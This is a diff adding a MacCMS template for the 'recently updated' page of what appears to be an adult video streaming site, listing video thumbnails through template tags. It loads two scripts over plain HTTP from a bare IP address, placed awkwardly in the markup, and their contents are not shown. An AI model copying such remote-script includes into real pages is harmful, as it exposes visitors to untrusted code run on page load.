@@ -1,0 +1,86 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, maximum-scale=1">
+<title>最近更新-{$maccms.site_name}</title>
+    <meta name="keywords" content="{$maccms.site_keywords}" />
+    <meta name="description" content="{$maccms.site_description}" />
+<meta name="google-site-verification" content="fBWwM1TGchUBQPEDfYk6YZ_FS_5S8smyTmR-ex5LIkk"/>
+<meta name="theme-color" content="#222">
+<meta property="og:type" content="website">
+<link rel="prefetch" href="{$maccms.path_tpl}js/videojs.hls.js">
+<link rel="prefetch" href="{$maccms.path_tpl}js/dash.all.js">
+<link rel="prefetch" href="{$maccms.path_tpl}js/videojs-dash.min.js">
+<link rel="prefetch" href="{$maccms.path_tpl}js/videopage_jav.js">
+<link rel="shortcut icon" href="{$maccms.path_tpl}img/javico.ico">
+<link rel="stylesheet" type="text/css" href="{$maccms.path_tpl}font/fontcustom/fontcustom.css?551">
+<link rel="stylesheet" href="{$maccms.path_tpl}css/main.css?551" type="text/css">
+<style type="text/css">.err{color:red;}</style>
+<script> window._izq = window._izq || []; window._izq.push(["init"]); </script>
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+        })(window,document,'script','dataLayer','GTM-PDJBSQ');</script>
+ 
+</head>
+<body id="body">
+{include file="public/head"}
+<section class="sectionContent below_path_content">
+ 
+<div class="content-left-box fullGrid">
+<center><style>
+@media screen and (max-width:600px){.slbqzhf{width:90%;height:30px;margin-bottom:4px}}</style>
+<ul><script language="JavaScript" src="http://118.99.37.136/vip7/xx1.js"></script>
+</center> 
+<div class="control-bar padClear">
+<div class="wrapper">
+<h3 class="keyword"><span>最近更新 </h3>
+<div class="rank-group">
+<span class="label"></span>
+<div class="rank-dropdown">
+ 
+<span class="rank-title"></span>
+<i class="icon-arrowdown"></i>
+ 
+<ul class="rank-dropdown-menu">
+
+</ul>
+</div>
+</div>
+</div>
+</div>
+<div class="videoGroup">
+<div class="video-wrapper">
+{maccms:vod num="28" type="all" order="desc" by="time"}
+<div class="col-style d-4 t-2 m-2 lazy">
+<a class="videoBox" href="{:mac_url_vod_play($vo)}">
+<div class="videoBox_wrap">
+<div class="videoBox-cover" style="background-image:url('{$vo.vod_pic|mac_url_img}');">
+</div>
+<span class="videoBox-time">{$vo.vod_time|date='m-d',###}</span>
+</div>
+<div class="videoBox-info"><h4 class="title">{$vo.vod_name}</h4></div>
+<div class="videoBox-action">
+<span class="views"><i class="icon-views"></i><span class="number">{$vo.vod_score}</span></span>
+<span class="likes"><i class="icon-likes"></i><span class="number">{$vo.vod_hits}</span></span>
+</div>
+</a>
+</div>
+{/maccms:vod}
+</div>
+</div>
+<div class="pages" id="aapages">
+
+</div>
+<div class="container">
+<script language="JavaScript" src="http://118.99.37.136/vip7/xx3.js"></script>
+</div>
+</section>
+<script type="text/javascript" src="{$maccms.path_tpl}js/show_jav.js"></script>
+</div>
+ 
+{include file="public/foot"}
+</html>
